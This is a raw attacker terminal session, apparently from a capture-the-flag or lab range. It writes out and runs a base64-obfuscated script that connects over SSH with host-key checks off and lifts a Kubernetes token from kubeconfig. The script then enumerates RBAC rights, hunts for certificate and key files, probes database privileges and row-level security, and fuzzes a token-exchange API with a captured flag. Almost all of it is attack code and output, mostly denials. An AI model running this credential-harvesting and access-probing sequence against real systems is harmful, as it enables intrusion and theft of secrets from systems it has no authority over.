@@ -1,0 +1,224 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r17.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKSldUPSQoa3ViZWN0bCBjb25maWcgdmlldyAtLXJhdyAtbyBqc29ucGF0aD0ney51c2Vyc1swXS51c2VyLnRva2VufScpCkM9aHR0cHM6Ly9jbG91ZC1hcGkua2VwbGVyb3BzLnRlc3QKZWNobyAiPT09IEs4UyBOQU1FU1BBQ0VTID09PSIKa3ViZWN0bCBnZXQgbnMgMj4mMSB8IGhlYWQgLTIwCmVjaG8gIj09PSBDQU4tSSBMSVNUID09PSIKa3ViZWN0bCBhdXRoIGNhbi1pIC0tbGlzdCAyPiYxIHwgaGVhZCAtMzAKZWNobyAiPT09IENMVVNURVJST0xFQklORElOR1MgPT09IgprdWJlY3RsIGdldCBjbHVzdGVycm9sZWJpbmRpbmdzIC1vIHdpZGUgMj4mMSB8IGhlYWQgLTMwCmVjaG8gIj09PSBDTFVTVEVSUk9MRVMgPT09IgprdWJlY3RsIGdldCBjbHVzdGVycm9sZXMgMj4mMSB8IGhlYWQgLTQwCmVjaG8gIj09PSBTRUxGIFJVTEVTIHBlciBucyA9PT0iCmZvciBucyBpbiBmaWVsZGxpbmsgZGVmYXVsdCBrdWJlLXN5c3RlbSBzdXBwb3J0IGlkZW50aXR5IGRhdGEgZXhwb3J0IHdvcmtsb2FkczsgZG8KIGVjaG8gIi0tICRucyI7IGt1YmVjdGwgYXV0aCBjYW4taSAtLWxpc3QgLW4gJG5zIDI+JjEgfCBoZWFkIC04CmRvbmUKZWNobyAiPT09IENPTkZJR01BUFMgZGVmYXVsdC9rdWJlLXN5c3RlbSA9PT0iCmt1YmVjdGwgZ2V0IGNtIC1uIGRlZmF1bHQgMj4mMSB8IGhlYWQgLTEwCmt1YmVjdGwgZ2V0IGNtIC1uIGt1YmUtc3lzdGVtIDI+JjEgfCBoZWFkIC01CmVjaG8gIj09PSBDRVJUL0tFWSBGSUxFUyBvbiByb3dhbiA9PT0iCmZpbmQgL2hvbWUvcm93YW4gL2V0Yy9maWVsZGtlc3QqIC9vcHQgLW1heGRlcHRoIDUgXCggLW5hbWUgJyouY3J0JyAtbyAtbmFtZSAnKi5rZXknIC1vIC1uYW1lICcqLnBlbScgLW8gLW5hbWUgJyouanNvbicgXCkgMj4vZGV2L251bGwgfCBncmVwIC12IC1FICdjaHJvbWl1bXxcLmt1YmUvY2FjaGUnIHwgaGVhZCAtNjAKZWNobyAiPT09IEdSRVAgd29ya2xvYWQgdG9rZW4gc3RyaW5ncyBpbiBob21lID09PSIKZ3JlcCAtcklsIC1FICd3b3JrbG9hZF90b2tlbnxYLVdvcmtsb2FkfHRydXN0LXJlY29yZHx0cnVzdF9kb2N1bWVudCcgL2hvbWUvcm93YW4gMj4vZGV2L251bGwgfCBoZWFkIC0yMAplY2hvICI9PT0gREIgZXhwb3J0LnBhcnRpdGlvbl9iaW5kaW5ncyA9PT0iCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgJ3NlbGVjdCAqIGZyb20gZXhwb3J0LnBhcnRpdGlvbl9iaW5kaW5ncycgMj4mMSB8IGhlYWQgLTMwCmVjaG8gIj09PSBEQiB0YWJsZSBwcml2cyA9PT0iCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLUF0YyAic2VsZWN0IHRhYmxlX3NjaGVtYXx8Jy4nfHx0YWJsZV9uYW1lfHwnICd8fHN0cmluZ19hZ2cocHJpdmlsZWdlX3R5cGUsJywnKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5yb2xlX3RhYmxlX2dyYW50cyB3aGVyZSBncmFudGVlPWN1cnJlbnRfdXNlciBncm91cCBieSAxIG9yZGVyIGJ5IDEiIDI+JjEgfCBoZWFkIC00MAplY2hvICI9PT0gREIgc3VwcG9ydCB0YWJsZXMgPT09Igpwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1jICdzZWxlY3QgKiBmcm9tIHN1cHBvcnQuY3VzdG9tZXJfbWlncmF0aW9uX2hpc3RvcnknIDI+JjEgfCBoZWFkIC0yMApwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1jICdzZWxlY3QgY291bnQoKikgZnJvbSBzdXBwb3J0LmN1c3RvbWVyX3JlY29yZHMnIDI+JjEgfCBoZWFkIC01CmVjaG8gIj09PSBSTFMgPT09Igpwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1BdGMgInNlbGVjdCBuLm5zcG5hbWV8fCcuJ3x8Yy5yZWxuYW1lfHwnIHJscz0nfHxjLnJlbHJvd3NlY3VyaXR5fHwnIGZvcmNlZD0nfHxjLnJlbGZvcmNlcm93c2VjdXJpdHkgZnJvbSBwZ19jbGFzcyBjIGpvaW4gcGdfbmFtZXNwYWNlIG4gb24gbi5vaWQ9Yy5yZWxuYW1lc3BhY2Ugd2hlcmUgbi5uc3BuYW1lIGluICgnc3VwcG9ydCcsJ2V4cG9ydCcsJ3dvcmtzcGFjZScsJ3B1YmxpYycpIiAyPiYxIHwgaGVhZCAtMzAKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtQXRjICJzZWxlY3Qgc2NoZW1hbmFtZXx8Jy4nfHx0YWJsZW5hbWV8fCcgcG9sPSd8fHBvbGljeW5hbWV8fCcgcm9sZXM9J3x8cm9sZXM6OnRleHR8fCcgY21kPSd8fGNtZHx8JyBxdWFsPSd8fGNvYWxlc2NlKHF1YWwsJycpIGZyb20gcGdfcG9saWNpZXMiIDI+JjEgfCBoZWFkIC0zMAplY2hvICI9PT0gQ0xPVUQtQVBJIEVYUE9SVCBST1VURVMgKEpXVCkgPT09Igpmb3IgcCBpbiBhcGkvZXhwb3J0cy9FWFAtMjg0MSBhcGkvZXhwb3J0cy9FWFAtMjg0MS9kZWZpbml0aW9uIGFwaS9zY2hlZHVsZXMvU0NIRUQtMjg0MSBhcGkvbWFpbnRlbmFuY2UgYXBpL3BvbGljaWVzL2RlZmF1bHQgYXBpL2J1aWxkLXJlY29yZHMvQkxELVJFTC03NDI7IGRvCiBlY2hvICItLSAkcCI7IGN1cmwgLXNTayAtbSA4IC13ICcgWyV7aHR0cF9jb2RlfV0nIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEpXVCIgIiRDLyRwIiB8IGhlYWQgLWMgNzAwOyBlY2hvCmRvbmUKZWNobyAiPT09IFRPS0VOIEVYQ0hBTkdFIEhFQURFUiBNQVRSSVggKFcyKSA9PT0iClc9IkZMQUd7NmJiNjYwNzRmMjMyNTQwNX0iCmZvciBoIGluICJYLVdvcmtzcGFjZS1Ub2tlbiIgIlgtRmllbGRrZXN0LVdvcmtzcGFjZS1Ub2tlbiIgIldvcmtzcGFjZS1Ub2tlbiIgIlgtV29ya3NwYWNlIiAiWC1Ub2tlbiIgIlgtQXV0aC1Ub2tlbiIgIlgtRmllbGRrZXN0LVRva2VuIiAiWC1Xb3Jrc3BhY2UtSWQiOyBkbwogZm9yIG0gaW4gR0VUIFBPU1Q7IGRvCiAgY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvbyAtdyAnJXtodHRwX2NvZGV9JyAtWCAkbSAtSCAiJGg6ICRXIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQy9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIikKICBlY2hvICItLSAkbSBbJGhdIC0+ICRjb2RlIDo6ICQoaGVhZCAtYyAyMjAgL3RtcC9vIHwgdHIgJ1xuJyAnICcpIgogZG9uZQpkb25lCmZvciBxIGluIHdvcmtzcGFjZV90b2tlbiB0b2tlbjsgZG8KIGNvZGU9JChjdXJsIC1zU2sgLW0gNiAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgIiRDL2FwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2U/JHE9JFciKTsgZWNobyAiLS0gR0VUID8kcSAtPiAkY29kZSA6OiAkKGhlYWQgLWMgMjAwIC90bXAvb3x0ciAnXG4nICcgJykiCmRvbmUKZm9yIGEgaW4gIldvcmtzcGFjZSAkVyIgIkJlYXJlciAkVyIgIlRva2VuICRXIiAiV29ya2xvYWQgJFciOyBkbwogY29kZT0kKGN1cmwgLXNTayAtbSA2IC1vIC90bXAvbyAtdyAnJXtodHRwX2NvZGV9JyAtSCAiQXV0aG9yaXphdGlvbjogJGEiICIkQy9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIik7IGVjaG8gIi0tIEdFVCBhdXRoWyRhXSAtPiAkY29kZSA6OiAkKGhlYWQgLWMgMjAwIC90bXAvb3x0ciAnXG4nICcgJykiCmRvbmUKZWNobyAiPT09IFRPS0VOIEVYQ0hBTkdFIEJPRFkgRklFTERTID09PSIKZm9yIGYgaW4gd29ya3NwYWNlX3Rva2VuIHRva2VuIHdvcmtzcGFjZVRva2VuIHdvcmtzcGFjZV9pZCB3b3Jrc3BhY2U7IGRvCiBmb3IgbSBpbiBQT1NUIFBVVDsgZG8KICBjb2RlPSQoY3VybCAtc1NrIC1tIDYgLW8gL3RtcC9vIC13ICcle2h0dHBfY29kZX0nIC1YICRtIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICJ7XCIkZlwiOlwiJFdcIn0iICIkQy9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIik7IGVjaG8gIi0tICRtIGJvZHkgJGYgLT4gJGNvZGUgOjogJChoZWFkIC1jIDIwMCAvdG1wL298dHIgJ1xuJyAnICcpIgogZG9uZQpkb25lCmVjaG8gIj09PSBUT0tFTiBFWENIQU5HRSBDT09LSUUvRk9STSA9PT0iCmNvZGU9JChjdXJsIC1zU2sgLW0gNiAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgLUggIkNvb2tpZTogd29ya3NwYWNlX3Rva2VuPSRXIiAiJEMvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIpOyBlY2hvICItLSBjb29raWUgLT4gJGNvZGUgOjogJChoZWFkIC1jIDIwMCAvdG1wL298dHIgJ1xuJyAnICcpIgpjb2RlPSQoY3VybCAtc1NrIC1tIDYgLW8gL3RtcC9vIC13ICcle2h0dHBfY29kZX0nIC1YIFBPU1QgLWQgIndvcmtzcGFjZV90b2tlbj0kVyIgIiRDL2FwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2UiKTsgZWNobyAiLS0gZm9ybSAtPiAkY29kZSA6OiAkKGhlYWQgLWMgMjAwIC90bXAvb3x0ciAnXG4nICcgJykiClJTSAplY2hvIERPTkVfSzE0X1IxNwo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r17.sh; bash /tmp/k14_r17.sh; echo DONEMARK_1795201265181$((6*7))
+=== K8S NAMESPACES ===
+Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "namespaces" in API group "" at the cluster scope
+=== CAN-I LIST ===
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+                                                [/api]                                 []               [get]
+                                                [/apis/*]                              []               [get]
+                                                [/apis]                                []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/healthz]                             []               [get]
+                                                [/livez]                               []               [get]
+                                                [/livez]                               []               [get]
+                                                [/openapi/*]                           []               [get]
+                                                [/openapi]                             []               [get]
+                                                [/openid/v1/jwks/]                     []               [get]
+                                                [/openid/v1/jwks]                      []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/readyz]                              []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version/]                            []               [get]
+                                                [/version]                             []               [get]
+                                                [/version]                             []               [get]
+=== CLUSTERROLEBINDINGS ===
+Error from server (Forbidden): clusterrolebindings.rbac.authorization.k8s.io is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "clusterrolebindings" in API group "rbac.authorization.k8s.io" at the cluster scope
+=== CLUSTERROLES ===
+Error from server (Forbidden): clusterroles.rbac.authorization.k8s.io is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "clusterroles" in API group "rbac.authorization.k8s.io" at the cluster scope
+=== SELF RULES per ns ===
+-- fieldlink
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- default
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- kube-system
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- support
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- identity
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- data
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- export
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+-- workloads
+Resources                                       Non-Resource URLs                      Resource Names   Verbs
+selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
+clustertrustbundles.certificates.k8s.io         []                                     []               [get list watch]
+                                                [/.well-known/openid-configuration/]   []               [get]
+                                                [/.well-known/openid-configuration]    []               [get]
+                                                [/api/*]                               []               [get]
+=== CONFIGMAPS default/kube-system ===
+Error from server (Forbidden): configmaps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "configmaps" in API group "" in the namespace "default"
+Error from server (Forbidden): configmaps is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "configmaps" in API group "" in the namespace "kube-system"
+=== CERT/KEY FILES on rowan ===
+/home/rowan/.config/fieldlink/support-client.json
+/home/rowan/repos_k05/release-signer-history/release-signer-history/release-public-key.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/corpus/policy-corpus-2026-09-r4.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/api/corpus-check-template.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/api/accept-template.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/api/opcode-model-template.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/api/program-model-template.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/api/condition-set-template.json
+/home/rowan/repos_k05/policy-compiler/policy-compiler/api/fragment-assembly-guide.json
+/home/rowan/repos/release-signer-history/release-signer-history/release-public-key.json
+/home/rowan/repos/policy-compiler/policy-compiler/corpus/policy-corpus-2026-09-r4.json
+/home/rowan/repos/policy-compiler/policy-compiler/api/corpus-check-template.json
+/home/rowan/repos/policy-compiler/policy-compiler/api/accept-template.json
+/home/rowan/repos/policy-compiler/policy-compiler/api/opcode-model-template.json
+/home/rowan/repos/policy-compiler/policy-compiler/api/program-model-template.json
+/home/rowan/repos/policy-compiler/policy-compiler/api/condition-set-template.json
+/home/rowan/repos/policy-compiler/policy-compiler/api/fragment-assembly-guide.json
+/home/rowan/work/reproducers/indexer-client.json
+/home/rowan/work/registry/inspection-normal.json
+/home/rowan/work/registry/consumer-request.json
+/home/rowan/work/samples/FK-SAMPLE-017.json
+/home/rowan/.local/share/keplerops/enrollment-ca.crt
+/home/rowan/.local/share/keplerops/ca.crt
+=== GREP workload token strings in home ===
+=== DB export.partition_bindings ===
+ export_id |    tenant     | partition_id | connector_revision | revision | is_current 
+-----------+---------------+--------------+--------------------+----------+------------
+ EXP-2841  | TEN-ARWC-019  | PART-ARWC-01 | FLK-7.4.2          |        6 | t
+ EXP-2841  | TEN-OTHER-001 | PART-ARWC-02 | FLK-7.3.1          |        5 | f
+(2 rows)
+
+=== DB table privs ===
+ERROR:  aggregate functions are not allowed in GROUP BY
+LINE 1: select table_schema||'.'||table_name||' '||string_agg(privil...
+                                                   ^
+=== DB support tables ===
+ERROR:  permission denied for schema support
+LINE 1: select * from support.customer_migration_history
+                      ^
+ERROR:  permission denied for schema support
+LINE 1: select count(*) from support.customer_records
+                             ^
+=== RLS ===
+support.customer_migration_history_pkey rls=false forced=false
+export.partition_bindings_pkey rls=false forced=false
+export.partition_bindings rls=false forced=false
+support.customer_migration_history rls=false forced=false
+support.customer_records rls=false forced=false
+support.customer_records_pkey rls=false forced=false
+=== CLOUD-API EXPORT ROUTES (JWT) ===
+-- api/exports/EXP-2841
+{"error":"k3s_rbac_denied"}
+ [403]
+-- api/exports/EXP-2841/definition
+{"error":"k3s_rbac_denied"}
+ [403]
+-- api/schedules/SCHED-2841
+{"error":"export_role_required"}
+ [403]
+-- api/maintenance
+{"error":"authentication_required"}
+ [401]
+-- api/policies/default
+{"error":"k3s_rbac_denied"}
+ [403]
+-- api/build-records/BLD-REL-742
+{"error":"authentication_required"}
+ [401]
+=== TOKEN EXCHANGE HEADER MATRIX (W2) ===
+-- GET [X-Workspace-Token] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Workspace-Token] -> 401 :: {"error":"authentication_required"} 
+-- GET [X-Fieldkest-Workspace-Token] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Fieldkest-Workspace-Token] -> 401 :: {"error":"authentication_required"} 
+-- GET [Workspace-Token] -> 401 :: {"error":"authentication_required"} 
+-- POST [Workspace-Token] -> 401 :: {"error":"authentication_required"} 
+-- GET [X-Workspace] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Workspace] -> 401 :: {"error":"authentication_required"} 
+-- GET [X-Token] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Token] -> 401 :: {"error":"authentication_required"} 
+-- GET [X-Auth-Token] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Auth-Token] -> 401 :: {"error":"authentication_required"} 
+-- GET [X-Fieldkest-Token] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Fieldkest-Token] -> 401 :: {"error":"authentication_required"} 
+-- GET [X-Workspace-Id] -> 401 :: {"error":"authentication_required"} 
+-- POST [X-Workspace-Id] -> 401 :: {"error":"authentication_required"} 
+-- GET ?workspace_token -> 401 :: {"error":"authentication_required"} 
+-- GET ?token -> 401 :: {"error":"authentication_required"} 
+-- GET auth[Workspace FLAG{6bb66074f2325405}] -> 401 :: {"error":"authentication_required"} 
+-- GET auth[Bearer FLAG{6bb66074f2325405}] -> 401 :: {"error":"authentication_required"} 
+-- GET auth[Token FLAG{6bb66074f2325405}] -> 401 :: {"error":"authentication_required"} 
+-- GET auth[Workload FLAG{6bb66074f2325405}] -> 401 :: {"error":"authentication_required"} 
+=== TOKEN EXCHANGE BODY FIELDS ===
+-- POST body workspace_token -> 401 :: {"error":"authentication_required"} 
+-- PUT body workspace_token -> 501 :: <!DOCTYPE HTML> <html lang="en">     <head>         <meta charset="utf-8">         <title>Error response</title>     </head>     <body>         <h1>Error response</h1>         <p>Error code: 501</p>  
+-- POST body token -> 401 :: {"error":"authentication_required"} 
+-- PUT body token -> 501 :: <!DOCTYPE HTML> <html lang="en">     <head>         <meta charset="utf-8">         <title>Error response</title>     </head>     <body>         <h1>Error response</h1>         <p>Error code: 501</p>  
+-- POST body workspaceToken -> 401 :: {"error":"authentication_required"} 
+-- PUT body workspaceToken -> 501 :: <!DOCTYPE HTML> <html lang="en">     <head>         <meta charset="utf-8">         <title>Error response</title>     </head>     <body>         <h1>Error response</h1>         <p>Error code: 501</p>  
+-- POST body workspace_id -> 401 :: {"error":"authentication_required"} 
+-- PUT body workspace_id -> 501 :: <!DOCTYPE HTML> <html lang="en">     <head>         <meta charset="utf-8">         <title>Error response</title>     </head>     <body>         <h1>Error response</h1>         <p>Error code: 501</p>  
+-- POST body workspace -> 401 :: {"error":"authentication_required"} 
+-- PUT body workspace -> 501 :: <!DOCTYPE HTML> <html lang="en">     <head>         <meta charset="utf-8">         <title>Error response</title>     </head>     <body>         <h1>Error response</h1>         <p>Error code: 501</p>  
+=== TOKEN EXCHANGE COOKIE/FORM ===
+-- cookie -> 401 :: {"error":"authentication_required"} 
+-- form -> 401 :: {"error":"authentication_required"} 
+DONE_K14_R17
